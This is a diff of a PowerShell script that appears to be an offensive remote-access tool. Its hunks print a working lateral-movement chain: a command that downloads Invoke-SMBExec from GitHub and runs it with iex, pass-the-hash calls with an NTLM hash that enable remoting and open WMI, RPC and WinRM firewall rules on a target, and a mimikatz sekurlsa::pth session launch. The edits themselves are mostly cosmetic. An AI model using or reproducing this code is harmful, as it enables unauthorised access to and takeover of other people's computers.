@@ -104,10 +104,10 @@ $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
         Write-Host ""
         $Host.UI.RawUI.ForegroundColor = 'Blue'
         Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-SMBExec.ps1" -UseBasicParsing | iex
-        Invoke-SMBExec -Target $computer -Username $user -Hash $ntlmpass -Command "powershell.exe Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private ; winrm quickconfig -quiet ; Enable-PSRemoting -Force" -verbose -ErrorAction SilentlyContinue
-        Invoke-SMBExec -Target $computer -Username $user -Hash $ntlmpass -Command "powershell.exe netsh advfirewall firewall set rule name='Instrumental de administración de Windows (WMI de entrada)' new enable=yes ; netsh advfirewall firewall set rule group='Administración Remota de Windows' new enable=yes" -verbose -ErrorAction SilentlyContinue
-        Invoke-SMBExec -Target $computer -Username $user -Hash $ntlmpass -Command "powershell.exe netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes ; netsh advfirewall firewall set rule name='Administración remota de servicios (RPC)' new enable=yes" -verbose -ErrorAction SilentlyContinue
-        Invoke-SMBExec -Target $computer -Username $user -Hash $ntlmpass -Command "powershell.exe netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule name='Administración remota de Windows (HTTP de entrada)' new enable=yes" -verbose -ErrorAction SilentlyContinue }
+        Invoke-SMBExec -Target $computer -Username $user -Hash $ntlmpass -Command "powershell.exe Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private ; winrm quickconfig -quiet ; Enable-PSRemoting -Force" -verbose 2> $null
+        Invoke-SMBExec -Target $computer -Username $user -Hash $ntlmpass -Command "powershell.exe netsh advfirewall firewall set rule name='Instrumental de administración de Windows (WMI de entrada)' new enable=yes ; netsh advfirewall firewall set rule group='Administración Remota de Windows' new enable=yes" -verbose 2> $null
+        Invoke-SMBExec -Target $computer -Username $user -Hash $ntlmpass -Command "powershell.exe netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes ; netsh advfirewall firewall set rule name='Administración remota de servicios (RPC)' new enable=yes" -verbose 2> $null
+        Invoke-SMBExec -Target $computer -Username $user -Hash $ntlmpass -Command "powershell.exe netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule name='Administración remota de Windows (HTTP de entrada)' new enable=yes" -verbose 2> $null }
         
 	'3' {
         Write-Host ""
@@ -149,9 +149,11 @@ $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
         
       } until ($input -in '1','2','3','4')
 
-Write-Host ""
-if(Test-Path variable:PassTheHash) { cmd /c $mimipath\mimikatz.exe privilege::debug token::elevate "sekurlsa::pth /user:$user /domain:$computer /ntlm:$ntlmpass /run:powershell New-PSSession -Name RDP -Computer $computer -Authentication Kerberos" exit }
-else { $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
+$Host.UI.RawUI.ForegroundColor = 'Gray'
+if(Test-Path variable:PassTheHash) { cmd /c $mimipath\mimikatz.exe privilege::debug token::elevate "sekurlsa::pth /user:$user /domain:$computer /ntlm:$ntlmpass /run:powershell New-PSSession -Name RDP -Computer $computer -Authentication Kerberos" exit
+Write-Host "" }
+else { Write-Host ""
+$credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
 $RDP = New-PSSession -Computer $computer -credential $credential }
 $Host.UI.RawUI.ForegroundColor = 'Yellow'
 Set-NetConnectionProfile -InterfaceAlias "Ethernet*" -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias "Wi-Fi*" -NetworkCategory Private
